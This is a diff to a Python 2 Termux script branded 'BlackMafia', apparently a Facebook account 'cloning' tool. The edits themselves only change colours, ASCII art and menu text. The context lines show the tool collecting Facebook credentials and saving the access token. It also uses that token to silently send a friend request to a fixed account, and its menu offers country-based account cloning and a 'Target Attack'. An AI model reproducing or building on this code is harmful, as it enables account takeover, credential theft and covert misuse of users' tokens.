@@ -72,18 +72,18 @@ logo = """
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
 \033[1;93m▇▇▇▇▇ WhatsApp Num\033[1;93m  03094161457 ▇▇▇▇▇
-\033[1;95m                　　　/)
-　               　_(⌒)＿　　/)
-　               ／ / ﾉ　 ヽ /ﾋE)
-               `/ｲ// /LLﾄLL|/ /
-               ｜|/ /(6　6(/ /
-               ｜/_/ " ヮ"ﾉ_/
-               /Y　ﾚ `ーイ /
-               ﾚ|　ヽ-====-＼
-               ﾚヽ　/／⌒＼⌒＼
-               　 ＼ｿ 　　｜  ｜
-　               　 )ヽ＿／＿／
-　                ／　　 ﾉ ﾉ
+\033[1;95m              　　　/)
+　             　_(⌒)＿　　/)
+　             ／ / ﾉ　 ヽ /ﾋ)
+             `/ｲ// /LLﾄLL|/ /
+             ｜|/ /(6　6(/ /
+             ｜/_/ " ヮ"ﾉ_/
+             /Y　ﾚ `ーイ /
+             ﾚ|　ヽ-====-＼
+             ﾚヽ　/／⌒＼⌒＼
+             　 ＼ｿ 　　｜  ｜
+　             　 )ヽ＿／＿／
+　              ／　　 ﾉ ﾉ
 \033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
 
 def tik():
@@ -119,7 +119,7 @@ print  """
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ╭━━━━╮╱▔▔▔╲      ▇▇▇▇▇▇┳┻┳┻┳┻")
 jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┃╯╯╭━┫▏╰╰╰▕      ▇▇▇▇▇▇┻┳┻┳┻┳")
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ┃╯╯┃▔╰┓▔▂▔▕╮     ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰╮╯┃┈╰┫╰━╯┏╯     ▇▇▇▇▇▇┳┻┳┻┳┻")
+jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰╮╯┃┈╰┫╰━╯┏╯     ▇▇▇▇▇▇┻┳┻┳┻┳")
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ┏╯╯┃╭━╯┳━┳╯      ▇▇▇▇▇▇┻┳┻┳┻┳")
 jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰━┳╯▔╲╱▔╭╮▔╲     ▇▇▇▇▇▇┳┻┳┻┳┻")
 jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃┈╲┈╲╱╭╯╮▕     ▇▇▇▇▇▇┻┳┻┳┻┳")
@@ -159,10 +159,10 @@ def login():
 		jalan(' \033[1;93mWarning: \033[1;92mUse a New Account To Login' )
 		jalan(' \033[1;93mWarning: \033[1;92mTermux All Version Working' )                 
 		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-		print('\033[1;97m▬\x1b[1;94m.......LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
+		print('\033[1;97m▬\x1b[1;91m.........LOGIN WITH FACEBOOK..........\x1b[1;97m▬' )
 		print('	' )
-		id = raw_input('\033[1;97m[+] \x1b[1;96mFacebook/Email\x1b[1;97m: \x1b[1;92m')
-		pwd = raw_input('\033[1;97m[+] \x1b[1;96mPassword\x1b[1;97m: \x1b[1;93m')
+		id = raw_input('\033[1;97m[●] \x1b[1;96mFacebook/Email\x1b[1;97m: \x1b[1;92m')
+		pwd = raw_input('\033[1;97m[●] \x1b[1;96mPassword\x1b[1;97m     : \x1b[1;93m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -189,7 +189,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;94mLogin Successful.•◈•..'
+				print '\n\x1b[1;91mLogin Successful.•◈•..'
 				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
@@ -235,18 +235,18 @@ def menu():
 	os.system("clear") #Dev:love_hacker
 	print logo
 	print "\033[1;97m«--•◈••◈•--\033[1;94mLogged in User Info\033[1;97m---•◈••◈•---»"
-	print "	   \033[1;97m ◈••◈Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
-	print "	   \033[1;97m ◈••◈ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
-	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mStart Cloning India"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mStart Cloning Pakistan"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96mStart Cloning Indonasia"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95mStart Cloning USA"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94mStart Cloning Bangladash"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;92mStart Target  Attack"
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;97mBlack Mafia   Massage "
-        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m8.\033[1;91mAfter Cloning Data Reset"
-	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;94mlogout "
+	print "	   \033[1;93m ◈••◈Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
+	print "	   \033[1;93m ◈••◈ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
+	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;93mStart Cloning India"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;92mStart Cloning Pakistan"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m3.\x1b[1;96mStart Cloning Indonasia"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m4.\x1b[1;95mStart Cloning USA"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m5.\x1b[1;94mStart Cloning Bangladash"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m6.\x1b[1;92mStart Target  Attack"
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m7.\x1b[1;91mBlack Mafia   Massage "
+        print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m8.\033[1;97mAfter Cloning Data Reset"
+	print "\033[1;91m-•◈•-\033[1;97m> \033[1;97m0.\033[1;94mlogout "
 	pilih()
 
 
